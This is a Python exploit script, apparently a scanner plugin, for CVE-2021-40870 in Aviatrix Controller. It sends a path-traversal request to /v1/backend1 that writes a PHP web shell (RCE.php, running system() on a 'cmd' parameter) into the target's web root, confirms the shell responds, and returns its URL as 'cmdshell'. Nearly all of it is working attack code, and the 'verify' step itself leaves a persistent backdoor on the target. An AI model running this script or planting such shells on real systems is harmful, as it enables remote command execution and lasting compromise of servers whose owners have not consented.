import requests
from urllib.parse import urlparse
import urllib

def verify(base_url):
    relsult = {
        'name': 'CVE-2021-40870 Aviatrix-Controller 远程代码执行',
        'vulnerable': False
    }
    try:
        user = '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'''
        filename = "RCE.php"
        shell = '''have fun : ) <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''
        oH = urlparse(base_url)
        a = oH.netloc.split(':')
        host = a[0]
        headers = {
            "Host": host,
            "User-Agent": user,
            "Connection": "close",
            "Content-Length": "109",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip",
        }
        timeout = 3
        body = f'CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{filename}&data=poc by agun{shell}'
        verify_url = urllib.parse.urljoin(base_url, '/v1/' + filename + '?cmd=')
        payload = urllib.parse.urljoin(base_url, '/v1/backend1')
        r = requests.post(payload, headers=headers, data=body, verify=False, timeout=timeout)
        check_file = requests.get(urllib.parse.urljoin(base_url, '/v1/' + filename), verify=False, timeout=timeout)
        check_file2 = requests.get(urllib.parse.urljoin(base_url, '/v1/axekfcerdps'), verify=False, timeout=timeout)
        verify_rep = requests.get(verify_url, headers=headers, timeout=timeout, verify=False)
        if check_file.status_code == 200 and check_file2.status_code != 200 and "have fun : )" in verify_rep.text:
            relsult['vulnerable'] = True
            relsult['url'] = base_url
            relsult['cmdshell'] = verify_url
            relsult['about'] = 'https://github.com/oxctdev/CVE-2021-40870'
            return relsult
        else:
            return relsult
    except:
        return relsult
